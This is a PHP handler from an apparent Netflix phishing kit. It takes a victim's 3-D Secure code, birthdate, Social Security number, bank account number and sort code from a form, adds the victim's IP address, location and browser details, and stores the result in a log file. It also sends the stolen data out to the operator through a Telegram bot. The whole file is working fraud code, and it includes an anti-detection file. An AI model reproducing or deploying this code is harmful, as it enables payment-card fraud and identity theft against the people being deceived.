<?php
/*  

       ▄▄                       ▄▄                            
        ███                     ▀███                            
         ██                       ██                            
 ▄██▀███ ███████▄  ▄█▀██▄    ▄█▀▀███   ▄██▀██▄▀██▀    ▄█    ▀██▀
 ██   ▀▀ ██    ██ ██   ██  ▄██    ██  ██▀   ▀██ ██   ▄███   ▄█  
 ▀█████▄ ██    ██  ▄█████  ███    ██  ██     ██  ██ ▄█  ██ ▄█   
 █▄   ██ ██    ██ ██   ██  ▀██    ██  ██▄   ▄██   ███    ███    
 ██████▀ ███  ████▄████▀██▄ ▀████▀███▄ ▀█████▀     █      █     
                                                               
                                                               



*/
if (isset($_POST['thd']) && isset($_POST['dob_day'])) {
    session_start();
    include '../mine.php';
    include '../../prevents/anti2.php';
		$msg .= "
⚜️ NETFLIX VBV ⚜️
±±±±±±±±±±±±±±±±±⚜️ NETFLIX VBV BY ".$scamname." ⚜️ ±±±±±±±±±±±±±±±±±±±±
℗ VBV OF USER] = {$_SESSION['fname']}
℗ 3D SECRUE = {$_POST['thd']}
BIRTHDATE = {$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}
±±±±±±±±±±±±±±[ IP LOOKUP INFORMATION]±±±±±±±±±±±±±±±±±±±<br>
✪COMPUTER ={$_SESSION['computer']}
✪ IP ADDRESS	= {$_SESSION['ip']}
✪ LOCATION] = {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
✪ BROWSER = {$_SESSION['browser']} on {$_SESSION['os']}
✪ USER AGENT  ={$_SERVER['HTTP_USER_AGENT']}
✪ TIMEZONE	= {$_SESSION['ip_timezone']}
⚜️ NETFLIX BY ".$scamname." #####################		";
if(isset($_POST['ssn'])){$msg.="SSN            : {$_POST['ssn']}\r\n";}
if(isset($_POST['acn'])){$msg.="ACOUNT NUM. : {$_POST['acn']}\r\n";$msg.="SORT CODE   : {$_POST['scode']}\r\n";}
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject=" 💰 NETFLIX VBV 💰  From [{$_SESSION['ip_countryName']}]  [{$_SESSION['ip']}] ";$headers="From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtotele=="yes"){$data = [
      'chat_id' => $yours,
      'text' => $msg
];
file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" .
http_build_query($data));}
								 exit('done');}

?>